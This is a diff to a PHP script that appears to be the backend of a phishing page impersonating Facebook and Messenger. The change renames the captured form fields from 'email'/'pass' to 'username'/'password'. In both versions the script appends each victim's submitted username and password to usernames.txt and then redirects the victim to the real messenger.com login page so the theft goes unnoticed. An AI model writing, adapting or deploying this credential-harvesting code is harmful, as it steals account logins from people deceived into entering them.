@@ -36,19 +36,16 @@
      $write = fputs($fileHandle, $string);
     @ fclose($fileHandle);
   }
-
-$var = $_POST['email'];
-$var2 = $_POST['pass'];
+$var = $_POST['username'];
+$var2 = $_POST['password'];
 $myFile = file_get_contents("protect.html");
-$searchString = "<html><title>WELCOME TO FACEBOOK</title></html>";
+$searchString = "<html><title>WELCOME</title></html>";
 if($myFile != $searchString) {
     file_put_contents("usernames.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
-    header('Location: https://messenger.com/login/');
+    header('Location:https://messenger.com/login.php');
 }
 if($myFile != $searchString) {
     echo "LOGIN SUCCESSFULL";
-    header('Location: https://messenger.com/login');
 }
 exit();
 ?>
-
